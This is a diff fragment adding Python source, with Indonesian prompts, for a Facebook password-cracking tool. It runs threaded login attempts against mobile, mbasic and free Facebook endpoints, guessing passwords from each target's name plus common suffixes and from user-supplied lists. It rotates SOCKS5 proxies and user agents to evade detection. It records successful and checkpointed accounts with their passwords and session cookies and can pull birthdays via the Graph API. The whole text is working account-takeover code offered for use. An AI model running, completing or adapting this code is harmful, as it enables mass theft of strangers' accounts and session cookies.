+			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+
+def crack_followers_pilihan():
+	print("")
+	x=f"\t\t{P2}[01] methode mobile ({H2}slowed cracked{P2})\n\t\t{P2}[02] methode mbasic ({K2}fast cracked{P2})\n\t\t{P2}[03] methode free  ({M2}not recommended {P2})"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	met = input(garis+" pilih : "+H)
+	if met in ["1","01","a"]:
+		metode.append("mobile")
+	elif met in ["2","02","b"]:
+		metode.append("mbasic")
+	elif met in ["3","03","c"]:
+		metode.append("free")
+	else:
+		metode.append("mobile")
+	print("")
+	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
+		pw_tambahan.append("ya")
+		x=f"\t\t{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
+		pw_gw=pw_nya_cok.split(',')
+		for cpw in pw_gw:
+			pw_ni.append(cpw)
+	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
+		pw_tambahan.append("no")
+	else:
+		pw_tambahan.append("no")
+	nanya_proxy = input(garis+" ingin menambahkan proxy tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if nanya_proxy in ["y","Y","yes","Ya"]:
+		proxp()
+	elif nanya_proxy in ["t","T","tidak","Tidak"]:
+		print("")
+	else:
+		proxp()
+	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
+		pw_belakang.append("ya")
+		x=f"\t\t{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
+		pw_gw=pw_nya_cok.split(',')
+		for cpw in pw_gw:
+			pw_lu.append(cpw)
+	elif pw_tambahai in ["t","T","Tidak","tidak","no"]:
+		pw_belakang.append("no")
+	else:
+		pw_belakang.append("no")
+	pilpas = input(garis+" ingin memakai password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pilpas in ["y","Y","ya","yes"]:
+		with tread(max_workers=30) as HikmatXF:
+			x=f"\t\t{P2}contoh password : {H2}anjing,ngentot,sayang "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			listpass = input(garis+"%s list password :%s "%(P,H))
+			if len(listpass)<=5:
+				exit("\n"+garis+"%s password minimal 6 angka"%(M))
+			x=f"\t\t{P2}list password crack {H2}{listpass}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			for user in id:
+				HikmatXF.submit(mobile, user, listpass.split(","))
+		print("")
+		if len(ok) != 0 or len(cp) != 0:
+			x=f"\t\t{P2}hasil cp mu : {K2}{len(cp)}\n\t\t{P2}hasil ok mu : {H2}{len(ok)}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+		else:
+			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+	elif pilpas in ["t","T","tidak","Tidak"]:
+		passwerv2()
+
+def passwerv2():
+	print("")
+	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	print("")
+	with tread(max_workers=30) as HikmatXD:
+		for koncol in id4:
+			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
+			prot = mmk.split(' ')[0]
+			pwr = []
+			if len(mmk)<6:
+				if len(prot)<3:
+					pass
+				else:
+					pwr.append(prot+'123')
+					pwr.append(prot+'12345')
+					pwr.append(prot+'1234')
+					pwr.append(prot+'123456')
+			else:
+				if len(prot)<3:
+					pwr.append(mmk)
+				else:
+					pwr.append(mmk)
+					pwr.append(prot+'123')
+					pwr.append(prot+'12345')
+					pwr.append(prot+'1234')
+					pwr.append(prot+'123456')
+			if 'ya' in pw_tambahan:
+				for xnxr in pw_ni:
+					pwr.append(xnxr)
+			if 'ya' in pw_belakang:
+				for asoe in pw_lu:
+					pwr.append(prot+asoe)
+			else:pass
+			if 'mobile' in metode:
+				HikmatXD.submit(mobilev2,uiz,pwr)
+			elif 'mbasic' in metode:
+				HikmatXD.submit(mbasicv2,uiz,pwr)
+			elif 'free' in metode:
+				HikmatXD.submit(freev2,uiz,pwr)
+			else:
+				HikmatXD.submit(mobilev2,uiz,pwr)
+	print("")
+	if ok != 0 or cp != 0:
+		x=f"\t\t{P2}hasil cp mu : {K2}{cp}\n\t\t{P2}hasil ok mu : {H2}{ok}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		input(garis+" kembali ")
+		menu()
+	else:
+		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		input(garis+" kembali ")
+		menu()
+		
+def mobilev2(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
+	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+	
+def mbasicv2(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	sys.stdout.write("\r \t\t%s• cracked %s/%s %sok:%s %scp:%s "%(P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
